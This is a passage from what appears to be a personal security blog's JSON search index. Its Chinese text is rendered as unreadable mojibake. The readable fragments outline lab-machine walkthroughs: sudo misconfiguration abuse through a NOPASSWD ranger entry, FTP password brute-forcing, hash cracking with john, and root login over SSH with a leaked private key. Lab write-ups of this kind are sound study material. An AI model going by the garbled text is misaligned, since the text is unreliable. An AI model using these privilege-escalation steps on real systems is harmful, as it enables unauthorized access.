è¾“å…¥ä¸€ä¸ªAæ¥å®Œæˆä»»åŠ¡ä½ å¯ä»¥ä¸€æ¬¡ä¸€æ¬¡çš„è¾“å…¥ä¹Ÿå¯ä»¥ -h æŸ¥çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–åŠŸèƒ½å‘ç°å¯ä»¥ â€“dashaziç›´æ¥è¾“å‡º getåˆ°äº†å¯†ç  åˆ°äº†morriç”¨æˆ·æˆ‘ä»¬ç›´æ¥sudo -l å‘ç°äº† (ALL) NOPASSWD: usrbinranger è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ç¼–è¾‘å™¨å¾ˆç®€å•äº†ç›´æ¥sudoè¿è¡ŒæŸ¥çœ‹å³å¯ ç„¶åå¤§å†™S æ‹¿åˆ°ç»ˆç«¯ TIPsoptç›®å½•æ˜¯ä¸€ä¸ªå­˜è½¯ä»¶çš„ç›®å½•æœ‰äº›è½¯ä»¶æ²¡æœ‰åœ¨é»˜è®¤çš„usrå°±åœ¨è¿™é‡Œ æ‰€ä»¥å¯ä»¥çœ‹çœ‹è¿™ä¸ªç›®å½• ä½ å¯ä»¥è¯•è¯•è·³è¿‡é…ç½®ç™»å½•SSH æŒ‡å®šå‘½ä»¤å¯ä»¥è¶Šè¿‡bashrc","tags":["SSH"]},{"title":"Looweré¶æœº---éš¾åº¦LOW-çŸ¥è¯†ç‚¹-SSHè§‚å¯Ÿ","path":"/2025/05/17/posts/Loweeeeee/","content":"Looweré¶æœº-åŒ…å«çŸ¥è¯†ç‚¹å‘ƒå‘ƒå‘ƒâ€“SSH 1ï¼šé€šè¿‡FTPå‘ç°äº†ä¸¤ä¸ªç”¨æˆ·ä¸€ä¸ªæ˜¯ftpuser,é€šè¿‡çˆ†ç ´è·å¾—å¯†ç ç™»å½•2ï¼šé€šè¿‡ftpuserè¿›å…¥shell ç„¶åæŸ¥çœ‹welcome å‘ç°æœ‰ä¸€ä¸ª backup.shcatä¸€ä¸‹å‘ç°welcomeå¯†ç é€šè¿‡johnçˆ†ç ´å¾—å‡ºå¯†ç 3ï¼šç„¶åç‰›é€¼çš„å°±æ¥äº† å‘ç°sudo æœ‰ä¸€ä¸ªä»€ä¹ˆfiglet ä½ ä¼šæƒ³å’Œcowsayæœ‰ç”¨å— ä½†æ˜¯.. é›¶è›‹ï¼ ç›´æ¥SSHrootå› ä¸ºä»€ä¹ˆå‘ç°welcomeä¸‹æœ‰SSHç›®å½•å¯èƒ½å¯ä»¥ç›´æ¥ç™»å½•welcome.sshid_rsa root@172.20.10.2 æ¥ç™»å½•root å› ä¸ºåŒ…å«äº†welcomeçš„å…¬é’¥ è°¢è°¢è§‚çœ‹","tags":["SSH"]},{"title":"å…³äºæˆ‘","path":"/about/index.html","content":"å…³äºæœ¬ç«™ å…³äºæˆ‘ æœ¬ç«™åŸºäºHexo + Stellar 1.33.1æ­å»º è®°å½•æŠ€æœ¯ã€ç”Ÿæ´»ä¸æ€è€ƒï¼Œæ¬¢è¿äº¤æµ~ è”ç³»æ–¹å¼ GitHubï¼šhttps://github.com/Starrui777 Bilibiliï¼šhttps://space.bilibili.com/107029949"},{"title":"æˆ‘çš„ç¬”è®°","path":"/notebooks/index.html","content":"æˆ‘çš„ä¸ªäººç¬”è®°è¿™é‡Œè®°å½•æ—¥å¸¸å­¦ä¹ ã€æ€è€ƒçš„ç¢ç‰‡åŒ–å†…å®¹ï¼ŒæŒ‰æ ‡ç­¾æ—¶é—´æ•´ç†~"},{"title":"æˆ‘çš„WikiçŸ¥è¯†åº“","path":"/wiki/index.html","content":"æ¬¢è¿æ¥åˆ°æˆ‘çš„Wikiè¿™é‡Œæ˜¯æˆ‘çš„æŠ€æœ¯çŸ¥è¯†åº“ï¼Œå·¦ä¾§ä¼šè‡ªåŠ¨ç”Ÿæˆæ–‡æ¡£ç›®å½•ï¼Œç‚¹å‡»å³å¯æµè§ˆå…·ä½“å†…å®¹~"}]